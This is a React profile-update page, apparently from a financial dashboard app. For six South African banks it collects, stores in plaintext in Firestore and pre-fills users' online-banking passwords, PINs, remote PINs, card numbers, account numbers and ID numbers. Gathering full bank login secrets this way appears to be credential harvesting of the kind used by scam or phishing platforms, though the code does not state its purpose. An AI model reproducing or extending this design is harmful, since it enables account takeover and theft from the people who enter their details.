import React, { useEffect, useState, useRef } from "react";
import { useAuth } from "../../contexts/AuthContext";
import clsx from "clsx";
import DashAppBar from "../comPeice/DashAppBar";
import MobileDashAppBar from "../comPeice/MobileDashAppBar";
import Visibility from "@material-ui/icons/Visibility";
import VisibilityOff from "@material-ui/icons/VisibilityOff";
import IconButton from "@material-ui/core/IconButton";
import {
  Box,
  Button,
  Container,
  Divider,
  FormControl,
  Input,
  InputAdornment,
  InputLabel,
  makeStyles,
  Paper,
  TextField,
  Typography,
} from "@material-ui/core";
import { db } from "../../firebase";
import { Link } from "react-router-dom";
import { Alert } from "@material-ui/lab";

const useStyles = makeStyles((theme) => ({
  root: {
    "& .MuiTextField-root": {
      margin: theme.spacing(1),
      width: "95%",
    },
  },
}));

function UpdateProfile() {
  const { currentUser } = useAuth();
  const classes = useStyles();
  const [capitecBank, setCapitecBank] = useState(false);
  const [nedbank, setNedbank] = useState(false);
  const [fbnbank, setFbnbank] = useState(false);
  const [strdBank, setStrdBank] = useState(false);
  const [absaBank, setAbsaBank] = useState(false);
  const [tymeBank, setTymeBank] = useState(false);

  // GET CAPTEC BANK DETAILS
  useEffect(() => {
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("Capitec_Bank")
      .onSnapshot((details) => {
        setCapitecBank(details.data());
      });
  }, []);

  // GET NED BANK BANK DETAILS
  useEffect(() => {
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("Ned_Bank")
      .onSnapshot((details) => {
        setNedbank(details.data());
      });
  }, []);

  // GET FBN BANK BANK DETAILS
  useEffect(() => {
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("FNB_Bank")
      .onSnapshot((details) => {
        setFbnbank(details.data());
      });
  }, [currentUser.uid]);

  // GET Standard BANK BANK DETAILS
  useEffect(() => {
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("Standard_Bank")
      .onSnapshot((details) => {
        setStrdBank(details.data());
      });
  }, []);

  // GET Absa Bank BANK BANK DETAILS
  useEffect(() => {
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("Abasa_Bank")
      .onSnapshot((details) => {
        setAbsaBank(details.data());
      });
  }, []);

  // GET Tyme Bank BANK BANK DETAILS
  useEffect(() => {
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("Tyme_Bank")
      .onSnapshot((details) => {
        setTymeBank(details.data());
      });
  }, []);

  const [success, setSuccess] = useState("");
  const [updateError, setUpdateError] = useState();

  // Captec Ref
  const capRefNum = useRef();
  const capRemotePin = useRef();

  // Ned Ref
  const nedSAId = useRef();
  const nedPwd = useRef();
  const nedPin = useRef();
  const nedCardNumber = useRef();

  // FBN Ref
  const fbnUNVal = useRef();
  const fbnPwdVal = useRef();
  const fbnPinVal = useRef();
  const fbnCardNumberVal = useRef();

  // Standard Ref
  const stdGM = useRef();
  const stdPWD = useRef();
  const stdPin = useRef();
  const stdCardNumber = useRef();

  // Abasa Ref
  const abaccNum = useRef();
  const abPWD = useRef();
  const abPin = useRef();

  // Tyme Ref
  const tymePWD = useRef();
  const tymePin = useRef();

  // submit function
  const handleSubmit = (e) => {
    e.preventDefault();
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("Capitec_Bank")
      .update({
        Reference_Number: capRefNum.current.value,
        Remote_Pin: capRemotePin.current.value,
      })
      .then(() => {
        setSuccess(
          "Your details have been successfully updated! You can now go back to the dashboard"
        );
      });
  };

  // submit function
  const handleSubmit2 = (e) => {
    e.preventDefault();
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("Ned_Bank")
      .update({
        SA_ID: nedSAId.current.value,
        Password: nedPwd.current.value,
        Pin: nedPin.current.value,
        Card_Number: nedCardNumber.current.value,
      })
      .then(() => {
        setSuccess(
          "Your details have been successfully updated! You can now go back to the dashboard"
        );
      });
  };

  // submit function 3
  const handleSubmit3 = (e) => {
    e.preventDefault();
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("FNB_Bank")
      .update({
        User_Name: fbnUNVal.current.value,
        Password: fbnPwdVal.current.value,
        Pin: fbnPinVal.current.value,
        Card_Number: fbnCardNumberVal.current.value,
      })
      .then(() => {
        setSuccess(
          "Your details have been successfully updated! You can now go back to the dashboard"
        );
      });
  };

  // submit function 4
  const handleSubmit4 = (e) => {
    e.preventDefault();
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("Standard_Bank")
      .update({
        Gmail: stdGM.current.value,
        Password: stdPWD.current.value,
        Pin: stdPin.current.value,
        Card_Number: stdCardNumber.current.value,
      })
      .then(() => {
        setSuccess(
          "Your details have been successfully updated! You can now go back to the dashboard"
        );
      });
  };

  // submit function 5
  const handleSubmit5 = (e) => {
    e.preventDefault();
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("Abasa_Bank")
      .update({
        Account_number: abaccNum.current.value,
        Password: abPWD.current.value,
        Pin: abPin.current.value,
      })
      .then(() => {
        setSuccess(
          "Your details have been successfully updated! You can now go back to the dashboard"
        );
      });
  };

  // submit function 6
  const handleSubmit6 = (e) => {
    e.preventDefault();
    db.collection("users")
      .doc(currentUser.uid)
      .collection("bank-info")
      .doc("Tyme_Bank")
      .update({
        Id_Number: tymePWD.current.value,
        Pin: tymePin.current.value,
      })
      .then(() => {
        setSuccess(
          "Your details have been successfully updated! You can now go back to the dashboard"
        );
      });
  };

  // BANK DETAILS STATE
  const [values, setValues] = React.useState({
    // referenceNumberVal: capitecBank?.Reference_Number,
    // remotePInVal: capitecBank?.Remote_Pin,
    // nedSAIDVal: nedbank?.SA_ID,
    // nedPinDVal: nedbank?.Pin,
    // nedPwdVal: nedbank?.Password,
    // nedCardNumVal: nedbank?.Card_Number,

    // : fbnbank?.Password,
    // : fbnbank?.Pin,
    // : fbnbank?.Card_Number,

    // strdBankGmail: strdBank?.Gmail,
    // strdBankPassword: strdBank?.Password,
    // abasaBankAccNum: absaBank?.Account_number,
    // abasaBankPin: absaBank?.Pin,
    // abasaBankPwd: absaBank?.Password,
    // tymeBankPin: absaBank?.Pin,
    // tymeBankPassword: absaBank?.Password,
    showPassword: false,
  });

  const handleChange = (prop) => (event) => {
    setValues({ ...values, [prop]: event.target.value });
  };

  const handleClickShowPassword = () => {
    setValues({ ...values, showPassword: !values.showPassword });
  };

  const handleMouseDownPassword = (event) => {
    event.preventDefault();
  };

  return (
    <div className="root">
      <div>
        <Box display={{ xs: "none", sm: "none", md: "block", lg: "block" }}>
          <DashAppBar />
        </Box>

        <Box display={{ xs: "block", sm: "block", md: "none", lg: "none" }}>
          <MobileDashAppBar />
        </Box>
      </div>

      <Paper
        style={{ width: "95%", maxWidth: "550px", margin: "100px auto" }}
        elevation={3}
      >
        {success && (
          <Alert severity="success" style={{ marginBottom: 20 }}>
            {success}
          </Alert>
        )}

        {updateError && (
          <Alert severity="error" style={{ marginBottom: 20 }}>
            {updateError}
          </Alert>
        )}
        {/*CAPTEC BANK FORM*/}

        {capitecBank && (
          <div>
            <Typography
              variant="h6"
              color="red"
              style={{ color: "grey", textAlign: "center", margin: "10px 0" }}
            >
              Capitec Bank
            </Typography>
            <Divider />
          </div>
        )}

        {/*NED BANK FORM*/}

        {nedbank && (
          <div>
            <Typography
              variant="h6"
              color="red"
              style={{ color: "grey", textAlign: "center", margin: "10px 0" }}
            >
              Ned Bank
            </Typography>
            <Divider />
          </div>
        )}

        {/*FBN BANK FORM*/}

        {fbnbank && (
          <div>
            <Typography
              variant="h6"
              color="red"
              style={{ color: "grey", textAlign: "center", margin: "10px 0" }}
            >
              FBN Bank
            </Typography>
            <Divider />
          </div>
        )}

        {/*Standard BANK FORM*/}

        {strdBank && (
          <div>
            <Typography
              variant="h6"
              color="red"
              style={{ color: "grey", textAlign: "center", margin: "10px 0" }}
            >
              Standard Bank
            </Typography>
            <Divider />
          </div>
        )}

        {/*Abasa BANK FORM*/}

        {absaBank && (
          <div>
            <Typography
              variant="h6"
              color="red"
              style={{ color: "grey", textAlign: "center", margin: "10px 0" }}
            >
              Abasa Bank
            </Typography>
            <Divider />
          </div>
        )}

        {/*Tyme BANK FORM*/}

        {tymeBank && (
          <div>
            <Typography
              variant="h6"
              color="red"
              style={{ color: "grey", textAlign: "center", margin: "10px 0" }}
            >
              Tyme Bank
            </Typography>
            <Divider />
          </div>
        )}

        <form
          className={classes.root}
          noValidate
          autoComplete="off"
          style={{ padding: "20px 30px" }}
        >
          {/*CAPTEC BANK FORM*/}
          {capitecBank && (
            <div>
              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="referenceNumber">
                  Enter New Reference Number
                </InputLabel>
                <Input
                  id="referenceNumber"
                  type="text"
                  defaultValue={capitecBank.Reference_Number}
                  inputRef={capRefNum}
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="remotePIn">
                  Enter New Remote Pin
                </InputLabel>
                <Input
                  id="remotePIn"
                  type={values.showPassword ? "text" : "password"}
                  defaultValue={capitecBank.Remote_Pin}
                  inputRef={capRemotePin}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={handleClickShowPassword}
                        onMouseDown={handleMouseDownPassword}
                      >
                        {values.showPassword ? (
                          <Visibility />
                        ) : (
                          <VisibilityOff />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                />
              </FormControl>
            </div>
          )}

          {/*NED BANK FORM*/}

          {nedbank && (
            <div>
              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="saID">Enter New SA ID</InputLabel>
                <Input
                  id="saID"
                  type="text"
                  inputRef={nedSAId}
                  defaultValue={nedbank.SA_ID}
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="nedCardNUM">
                  Enter new card number
                </InputLabel>
                <Input
                  id="nedCardNUM"
                  type="text"
                  inputRef={nedCardNumber}
                  defaultValue={nedbank.Card_Number}
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="nedPIN">Enter new Pin</InputLabel>

                <Input
                  id="nedPIN"
                  type={values.showPassword ? "text" : "password"}
                  inputRef={nedPin}
                  defaultValue={nedbank.Pin}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={handleClickShowPassword}
                        onMouseDown={handleMouseDownPassword}
                      >
                        {values.showPassword ? (
                          <Visibility />
                        ) : (
                          <VisibilityOff />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="nedPWD">Enter new password</InputLabel>
                <Input
                  id="nedPWD"
                  type={values.showPassword ? "text" : "password"}
                  inputRef={nedPwd}
                  defaultValue={nedbank.Password}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={handleClickShowPassword}
                        onMouseDown={handleMouseDownPassword}
                      >
                        {values.showPassword ? (
                          <Visibility />
                        ) : (
                          <VisibilityOff />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                />
              </FormControl>
            </div>
          )}

          {/*FBN BANK FORM*/}

          {fbnbank && (
            <div>
              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="fbnForm">Enter New User Name</InputLabel>
                <Input
                  id="fbnForm"
                  type="text"
                  inputRef={fbnUNVal}
                  defaultValue={fbnbank.User_Name}
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="fbnPwd">Enter new Password</InputLabel>
                <Input
                  id="fbnPwd"
                  type={values.showPassword ? "text" : "password"}
                  inputRef={fbnPwdVal}
                  defaultValue={fbnbank.Password}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={handleClickShowPassword}
                        onMouseDown={handleMouseDownPassword}
                      >
                        {values.showPassword ? (
                          <Visibility />
                        ) : (
                          <VisibilityOff />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="fbnPIN">Enter new Pin</InputLabel>
                <Input
                  id="fbnPIN"
                  type={values.showPassword ? "text" : "password"}
                  inputRef={fbnPinVal}
                  defaultValue={fbnbank.Pin}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={handleClickShowPassword}
                        onMouseDown={handleMouseDownPassword}
                      >
                        {values.showPassword ? (
                          <Visibility />
                        ) : (
                          <VisibilityOff />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="fbnCardNum">
                  Enter new Card Number
                </InputLabel>
                <Input
                  id="fbnCardNum"
                  type="text"
                  inputRef={fbnCardNumberVal}
                  defaultValue={fbnbank.Card_Number}
                />
              </FormControl>
            </div>
          )}

          {/*Standard BANK FORM*/}

          {strdBank && (
            <div>
              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="strdFormEmail">Enter New Email</InputLabel>

                <Input
                  id="strdFormEmail"
                  type="email"
                  inputRef={stdGM}
                  defaultValue={strdBank.Gmail}
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="strdFormPwd">
                  Enter new Password
                </InputLabel>
                <Input
                  id="strdFormPwd"
                  type={values.showPassword ? "text" : "password"}
                  inputRef={stdPWD}
                  defaultValue={strdBank.Password}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={handleClickShowPassword}
                        onMouseDown={handleMouseDownPassword}
                      >
                        {values.showPassword ? (
                          <Visibility />
                        ) : (
                          <VisibilityOff />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="strdFormPin">Enter new Pin</InputLabel>
                <Input
                  id="strdFormPin"
                  type={values.showPassword ? "text" : "password"}
                  inputRef={stdPin}
                  defaultValue={strdBank.Pin}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={handleClickShowPassword}
                        onMouseDown={handleMouseDownPassword}
                      >
                        {values.showPassword ? (
                          <Visibility />
                        ) : (
                          <VisibilityOff />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="strdFormCardNum">
                  Enter New Card Number
                </InputLabel>

                <Input
                  id="strdFormCardNum"
                  type="text"
                  inputRef={stdCardNumber}
                  defaultValue={strdBank.Card_Number}
                />
              </FormControl>
            </div>
          )}

          {/*Abasa BANK FORM*/}

          {absaBank && (
            <div>
              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="abasaFormAccNum">
                  Enter New Account Number
                </InputLabel>

                <Input
                  id="abasaFormAccNum"
                  type="text"
                  inputRef={abaccNum}
                  defaultValue={absaBank.Account_number}
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="abasaFormPwd">
                  Enter new Password
                </InputLabel>
                <Input
                  id="abasaFormPwd"
                  type={values.showPassword ? "text" : "password"}
                  inputRef={abPWD}
                  defaultValue={absaBank.Password}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={handleClickShowPassword}
                        onMouseDown={handleMouseDownPassword}
                      >
                        {values.showPassword ? (
                          <Visibility />
                        ) : (
                          <VisibilityOff />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="abasaFormPIn">Enter new Pin</InputLabel>
                <Input
                  id="abasaFormPIn"
                  type={values.showPassword ? "text" : "password"}
                  inputRef={abPin}
                  defaultValue={absaBank.Pin}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={handleClickShowPassword}
                        onMouseDown={handleMouseDownPassword}
                      >
                        {values.showPassword ? (
                          <Visibility />
                        ) : (
                          <VisibilityOff />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                />
              </FormControl>
            </div>
          )}

          {/*Tyme BANK FORM*/}

          {tymeBank && (
            <div>
              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="tymeFormPwd">Enter new Pin</InputLabel>
                <Input
                  id="tymeFormPwd"
                  type={values.showPassword ? "text" : "password"}
                  inputRef={tymePin}
                  defaultValue={tymeBank.Pin}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={handleClickShowPassword}
                        onMouseDown={handleMouseDownPassword}
                      >
                        {values.showPassword ? (
                          <Visibility />
                        ) : (
                          <VisibilityOff />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                />
              </FormControl>

              <FormControl
                className={clsx(classes.margin, classes.textField)}
                style={{ width: "100%" }}
              >
                <InputLabel htmlFor="tymeFormPIn">
                  Enter new ID Number
                </InputLabel>
                <Input
                  id="tymeFormPIn"
                  type={values.showPassword ? "text" : "password"}
                  inputRef={tymePWD}
                  defaultValue={tymeBank.Id_Number}
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={handleClickShowPassword}
                        onMouseDown={handleMouseDownPassword}
                      >
                        {values.showPassword ? (
                          <Visibility />
                        ) : (
                          <VisibilityOff />
                        )}
                      </IconButton>
                    </InputAdornment>
                  }
                />
              </FormControl>
            </div>
          )}

          {/* CAPTEC BTN*/}
          {capitecBank && (
            <div
              className="withdrawBtn"
              style={{
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
              }}
            >
              <Button
                variant="contained"
                style={{
                  width: "90%",
                  borderRadius: 25,
                  background:
                    " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                  color: "#fff",
                  padding: "10px 5px",
                  margin: 20,
                }}
                disableElevation
                type="submit"
                onClick={handleSubmit}
              >
                Update
              </Button>
            </div>
          )}

          {/* NED BTN*/}
          {nedbank && (
            <div
              className="withdrawBtn"
              style={{
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
              }}
            >
              <Button
                variant="contained"
                style={{
                  width: "90%",
                  borderRadius: 25,
                  background:
                    " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                  color: "#fff",
                  padding: "10px 5px",
                  margin: 20,
                }}
                disableElevation
                type="submit"
                onClick={handleSubmit2}
              >
                Update
              </Button>
            </div>
          )}

          {/* FBN BTN*/}
          {fbnbank && (
            <div
              className="withdrawBtn"
              style={{
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
              }}
            >
              <Button
                variant="contained"
                style={{
                  width: "90%",
                  borderRadius: 25,
                  background:
                    " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                  color: "#fff",
                  padding: "10px 5px",
                  margin: 20,
                }}
                disableElevation
                type="submit"
                onClick={handleSubmit3}
              >
                Update
              </Button>
            </div>
          )}

          {/* Standard BTN*/}
          {strdBank && (
            <div
              className="withdrawBtn"
              style={{
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
              }}
            >
              <Button
                variant="contained"
                style={{
                  width: "90%",
                  borderRadius: 25,
                  background:
                    " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                  color: "#fff",
                  padding: "10px 5px",
                  margin: 20,
                }}
                disableElevation
                type="submit"
                onClick={handleSubmit4}
              >
                Update
              </Button>
            </div>
          )}

          {/* Abasa BTN*/}
          {absaBank && (
            <div
              className="withdrawBtn"
              style={{
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
              }}
            >
              <Button
                variant="contained"
                style={{
                  width: "90%",
                  borderRadius: 25,
                  background:
                    " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                  color: "#fff",
                  padding: "10px 5px",
                  margin: 20,
                }}
                disableElevation
                type="submit"
                onClick={handleSubmit5}
              >
                Update
              </Button>
            </div>
          )}

          {/* Tyme BTN*/}
          {tymeBank && (
            <div
              className="withdrawBtn"
              style={{
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
              }}
            >
              <Button
                variant="contained"
                style={{
                  width: "90%",
                  borderRadius: 25,
                  background:
                    " linear-gradient(90deg, #d53369 0%, #daae51 100%)",
                  color: "#fff",
                  padding: "10px 5px",
                  margin: 20,
                }}
                disableElevation
                type="submit"
                onClick={handleSubmit6}
              >
                Update
              </Button>
            </div>
          )}
        </form>
      </Paper>
    </div>
  );
}

export default UpdateProfile;
